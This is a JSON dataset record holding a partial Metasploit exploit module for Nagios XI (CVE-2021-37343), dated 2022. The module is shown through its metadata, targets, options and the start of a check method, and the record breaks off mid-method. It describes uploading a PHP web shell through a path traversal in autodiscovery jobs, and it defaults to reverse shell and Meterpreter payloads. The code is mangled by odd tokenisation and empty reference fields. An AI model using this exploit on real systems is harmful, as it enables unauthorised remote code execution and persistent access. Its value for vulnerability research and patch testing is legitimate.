{
    "text": "vul_name : Nagios XI Autodiscovery Shell Upload ， vul_cve : CVE-2021-37343 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : Remote : HTTP : NagiosXi ， include Msf : Exploit : CmdStager ， include Msf : Exploit : FileDropper ， prepend Msf : Exploit : Remote : AutoCheck ， super (  ， update_info (  ， info ,  ， 'Name' => 'Nagios XI Autodiscovery Webshell Upload' ,  ， 'Description' => %q{ ， This module exploits a path traversal issue in Nagios XI before version 5.8.5 ( CVE-2021-37343 ) . ， The path traversal allows a remote and authenticated administrator to upload a PHP web shell ， and execute code as `www-data`. The module achieves this by creating an autodiscovery job ， with an `id` field containing a path traversal to a writable and remotely accessible directory ,  ， and `custom_ports` field containing the web shell. A cron file will be created using the chosen ， path and file name , and the web shell is embedded in the file. ， After the web shell has been written to the victim , this module will then use the web shell to ， establish a Meterpreter session or a reverse shell. By default , the web shell is deleted by ， the module , and the autodiscovery job is removed as well. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'Claroty Team82' ,  # vulnerability discovery ， 'jbaines-r7' # metasploit module ，  ]  ,  ， ' ，  [ 'CVE' , '2021-37343' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'DisclosureDate' => '2021-07-15' ,  ， 'Platform' => [ 'unix' , 'linux' ]  ,  ， 'Arch' => [ ARCH_CMD , ARCH_X86 , ARCH_X64 ]  ,  ， 'Privileged' => false ,  ， 'Targets' => [  ，  [  ， 'Unix Command' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'Type' => : unix_cmd ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'cmd/unix/reverse_openssl' ， } ,  ， 'Payload' => { ， 'Append' => ' & disown' ， } ， } ，  ]  ,  ，  [  ， 'Linux Dropper' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : linux_dropper ,  ， 'CmdStagerFlavor' => [ 'printf' ]  ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' ， } ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 1 ,  ， 'DefaultOptions' => { ， 'RPORT' => 443 ,  ， 'SSL' => true ,  ， 'MeterpreterTryToFork' => true ， } ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [ IOC_IN_LOGS , ARTIFACTS_ON_DISK ]  ， } ， register_options [  ， OptString.new ( 'USERNAME' ,  [ true , 'Username to authenticate with' , 'nagiosadmin' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'Password to authenticate with' , nil ]  )  ,  ， OptInt.new ( 'DEPTH' ,  [ true , 'The depth of the path traversal' , 10 ]  )  ,  ， OptString.new ( 'WEBSHELL_NAME' ,  [ false , 'The name of the uploaded webshell. This value is random if left unset' , nil ]  )  ,  ， OptBool.new ( 'DELETE_WEBSHELL' ,  [ true , 'Indicates if the webshell should be deleted or not.' , true ]  )  ，  ]  ，  @ webshell_uri = '/includes/components/highcharts/exporting-server/temp/' ，  @ webshell_path = '/usr/local/nagiosxi/html/includes/components/highcharts/exporting-server/temp/' ， end ，  # Authenticate and grab the version from the dashboard. Store auth cookies for later user. ， def check ， login_result , res_array = nagios_xi_login ( datastore [ 'USERNAME' ]  , datastore [ 'PASSWORD' ]  , false )  ， case login_result ， when 1.3 # An error occurred",
    "time": "2022.02.15"
}